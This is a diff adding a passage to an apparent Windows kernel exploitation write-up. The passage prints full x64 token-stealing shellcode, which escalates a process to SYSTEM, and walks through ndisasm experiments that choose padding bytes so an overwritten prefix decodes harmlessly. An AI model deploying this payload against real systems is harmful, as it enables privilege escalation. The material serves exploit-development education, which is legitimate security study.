@@ -435,4 +435,69 @@ I'm honestly not sure why this is happening to us. I can't really determine what
 
 We can leverage the `ndisasm` utility on Linux to test out some alternative scenarios dealing with our overwrite. Our model shellcode is this: 
 ```
+ "\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
+ "\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
+ "\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
+ "\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
+ "\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
+ "\x5B\x59\x58\xc3"
+ ```
+ 
+ Ok, so what happens when we take that first line, overwrite the first two bytes with `\x26\x00` ? 
+ ```
+ root@kali:~# echo -ne '\x26\x00\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00' | ndisasm -b64 -
+00000000  26004153          add [es:rcx+0x53],al
+00000004  52                push rdx
+00000005  4831C0            xor rax,rax
+00000008  65488B8088010000  mov rax,[gs:rax+0x188]
+```
+
+This is precisely what we saw in the WinDBG disassembler! Perfect. Let's experiment. My first thought: We are overwriting two bytes, let's put two NOPs as padding! We would then end up with something like this:
+```
+root@kali:~# echo -ne '\x26\x00\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00' | ndisasm -b64 -
+00000000  26005051          add [es:rax+0x51],dl
+00000004  4153              push r11
+00000006  52                push rdx
+00000007  4831C0            xor rax,rax
+0000000A  65488B8088010000  mov rax,[gs:rax+0x188]
+```
+
+Oof, that's still not good. This would also definitely be an access violation as you'll remember `rax` was a small value when we run our exploit at this stage. This memory wouldn't be mapped appropriately. We need a way to alter how the subsequent commands after `\x26\x00` are being interpreted. What if we add a third padding byte that's purpose is to separate the `\x26\x00` opcodes as non-harmfully as possible from the rest of our shellcode? I started experimenting. Let's just try adding a `\x00` byte and see what happens!
+```
+root@kali:~# echo -ne '\x26\x00\x00\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00' | ndisasm -b64 -
+00000000  260000            add [es:rax],al
+00000003  50                push rax
+00000004  51                push rcx
+00000005  4153              push r11
+00000007  52                push rdx
+00000008  4831C0            xor rax,rax
+0000000B  65488B8088010000  mov rax,[gs:rax+0x188]
+```
+
+This is still not optimal, as you can see, we're still directly writing to memory that is at a very low address space and will cause us problems most likely. However, we did successfully truncate this series of operations to only 3 bytes! I started spamming potential 3rd byte padding candidates with a script and eventually landed on candidate `\xff`. Let's test this out and see if this works for our purposes:
+```
+root@kali:~# echo -ne '\x26\x00\xff\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00' | ndisasm -b64 -
+00000000  2600FF            es add bh,bh
+00000003  50                push rax
+00000004  51                push rcx
+00000005  4153              push r11
+00000007  52                push rdx
+00000008  4831C0            xor rax,rax
+0000000B  65488B8088010000  mov rax,[gs:rax+0x188]
+```
+
+Wow, now this is perfect. All we're doing now is just adding a register to a register. There's not really any way this can get us in trouble. And since our shellcode runs directly after this first operation, if we had to, we could change the register back to its original value with no problem!
+
+This instruction `es add bh,bh` doesn't really cause problems either. You can read [here](https://stackoverflow.com/questions/19739303/what-does-mean-in-x86) about how data segment registers work on 64 bit operating systems. 
+
+So this is perfect. We can update our shellcode now to be the following:
+```
+"\x90\x90\xff\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
+"\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
+"\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
+"\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
+"\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
+"\x5B\x59\x58\xc3
+```
+
 
